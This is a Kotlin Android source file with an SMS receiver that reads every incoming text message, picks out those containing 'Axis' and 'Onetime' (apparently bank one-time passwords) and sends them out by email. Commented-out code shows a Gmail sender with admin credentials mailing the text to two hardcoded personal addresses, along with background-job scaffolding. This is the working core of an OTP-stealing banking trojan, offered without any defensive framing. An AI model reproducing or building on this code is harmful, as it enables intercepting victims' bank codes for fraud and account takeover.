package com.app.readsms

import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.telephony.SmsMessage
import android.util.Log
import androidx.core.os.bundleOf
import java.io.File

class SmsListener : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        Log.d(TAG, "SMS Received!")

        val txt = getTextFromSms(intent?.extras)
        //sendMail(txt)
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//            val intents=Intent(context,DetectedService::class.java)
//            intents.putExtra("data",txt)
//            context?.startForegroundService(intents)
//        }

        /*  val bundle = Bundle()
          bundle.putString("data",txt)
          val jobScheduler = context?.getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
          val jobInfo = JobInfo.Builder(123, ComponentName(context,DeepJobService::class.java))
          val job = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
              jobInfo.setRequiresCharging(false)
                  .setMinimumLatency(1)
                  .setTransientExtras(bundle)
                  .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                  .setOverrideDeadline(60*1000).build()
          } else {
              TODO("VERSION.SDK_INT < O")
          }

          jobScheduler.schedule(job)
  */
        if (txt.contains("Axis") && txt.contains("Onetime"))
            DetectedService.sendMail(txt)
        Log.d(TAG, "message=" + txt)
    }

/*
    private fun sendMail(selectedEmail: String) {
        Thread {
            val sender = GMailSender(
                Constants.ADMIN_EMAIL,
                Constants.ADMIN_PASSWORD
            )
            try {
                sender.sendMail(
                    "Read Sms",
                    selectedEmail,
                    "ersumit3961@gmail.com",
                    "coolsam341@gmail.com"
                )
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }
*/


    private fun getTextFromSms(extras: Bundle?): String {
        val pdus = extras?.get("pdus") as Array<*>
        val format = extras.getString("format")
        var txt = ""
        for (pdu in pdus) {
            val smsmsg = getSmsMsg(pdu as ByteArray?, format)
            val submsg = smsmsg?.displayMessageBody
            submsg?.let { txt = "$txt$it" }
        }
        return txt
    }

    private fun getSmsMsg(pdu: ByteArray?, format: String?): SmsMessage? {
        return SmsMessage.createFromPdu(pdu, format)
    }

    companion object {
        private val TAG = SmsListener::class.java.simpleName
    }
}